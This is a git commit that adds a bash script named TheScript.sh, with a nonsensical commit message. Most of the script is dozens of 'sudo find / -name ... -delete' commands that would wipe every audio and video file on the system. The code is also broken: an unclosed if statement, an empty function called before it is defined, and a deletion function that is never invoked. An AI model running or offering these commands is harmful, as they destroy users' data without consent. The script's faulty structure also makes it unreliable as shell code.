a0da31e3b8a78ee358b977ae0d5ae48be7c57629
Imperious22M <45678466+Imperious22M@users.noreply.github.com>
2018-12-13 15:07:56 -0800

    Hy
    Cain needs a Joahnna.

---
+++ Linux/TheScript.sh
@@ -0,0 +1,90 @@
+#!/bin/bash
+
+
+echo "Hy"
+read Start
+if [ $Start == "1" ]; then
+Gofun
+else 
+echo " F off"
+cd $(pwd)
+
+Gofun(){
+
+}
+
+DeleteFiles(){
+
+#3ga *.aac *.aiff *.amr *.ape *.arf *.asf *.asx *.cda *.dvf *.flac *.gp4 *.gp5 *.gpx *.logic *.m4a *.m4b*.midi *.pcm *.rec *.snd *.sng *.uax *.wav *.wma *.wpl *.zab
+#->Video
+#-->*.mkv *.webm *.flv *.vob *.ogv *.drc *.gifv *.mng *.avi$ *.mov *.qt *.wmv *.yuv *.rm *.rmvb *.asf *.amv *.mp4$ *.m4v *.mp *.m?v *.svi *.3gp *.flv *.f4v
+sudo find / -name '*.mkv' -type f -delete
+sudo find / -name '*.webm' -type f -delete
+sudo find / -name '*.flv' -type f -delete
+sudo find / -name '*.vob' -type f -delete
+sudo find / -name '*.ogv' -type f -delete
+sudo find / -name '*.drc' -type f -delete
+sudo find / -name '*.gifv' -type f -delete
+sudo find / -name '*.mng' -type f -delete
+sudo find / -name '*.avi$' -type f -delete
+sudo find / -name '*.wmv' -type f -delete
+sudo find / -name '*.mov' -type f -delete
+sudo find / -name '*.qt' -type f -delete
+sudo find / -name '*.mov' -type f -delete
+sudo find / -name '*.yuv' -type f -delete
+sudo find / -name '*.rm' -type f -delete
+sudo find / -name '*.rmvb' -type f -delete
+sudo find / -name '*.asf' -type f -delete
+sudo find / -name '*.mp4$' -type f -delete
+sudo find / -name '*.amv' -type f -delete
+sudo find / -name '*.m4v' -type f -delete
+sudo find / -name '*.mp' -type f -delete
+sudo find / -name '*.m?v' -type f -delete
+sudo find / -name '*.svi' -type f -delete
+sudo find / -name '*.3gp' -type f -delete
+sudo find / -name '*.flv' -type f -delete
+sudo find / -name '*.f4v' -type f -delete
+
+
+sudo find / -name '*.mp3' -type f -delete
+sudo find / -name '*.3ga' -type f -delete
+sudo find / -name '*.mp4' -type f -delete
+sudo find / -name '*.avi' -type f -delete
+sudo find / -name '*.mpg' -type f -delete
+sudo find / -name '*.mpeg' -type f -delete
+sudo find / -name '*.flac' -type f -delete
+sudo find / -name '*.m4a' -type f -delete
+sudo find / -name '*.flv' -type f -delete
+sudo find / -name '*.aac' -type f -delete
+sudo find / -name '*.aiff' -type f -delete
+sudo find / -name '*.amr' -type f -delete
+sudo find / -name '*.ape' -type f -delete
+sudo find / -name '*.ogg' -type f -delete
+sudo find / -name '*.arf' -type f -delete
+sudo find / -name '*.asf' -type f -delete
+sudo find / -name '*.asx' -type f -delete
+sudo find / -name '*.cda' -type f -delete
+sudo find / -name '*.dvf' -type f -delete
+sudo find / -name '*.flac' -type f -delete
+sudo find / -name '*.gp4' -type f -delete
+sudo find / -name '*.gp5' -type f -delete
+sudo find / -name '*.gpx' -type f -delete
+sudo find / -name '*.logic' -type f -delete
+sudo find / -name '*.m4a' -type f -delete
+sudo find / -name '*.m4p' -type f -delete
+sudo find / -name '*.m4b' -type f -delete
+sudo find / -name '*.midi' -type f -delete
+sudo find / -name '*.pcm' -type f -delete
+sudo find / -name '*.rec' -type f -delete
+sudo find / -name '*.snd' -type f -delete
+sudo find / -name '*.sng' -type f -delete
+sudo find / -name '*.uax' -type f -delete
+sudo find / -name '*.wav' -type f -delete
+sudo find / -name '*.wma' -type f -delete
+sudo find / -name '*.wpl' -type f -delete
+sudo find / -name '*.zav' -type f -delete
+
+
+}
+
+Gofun 
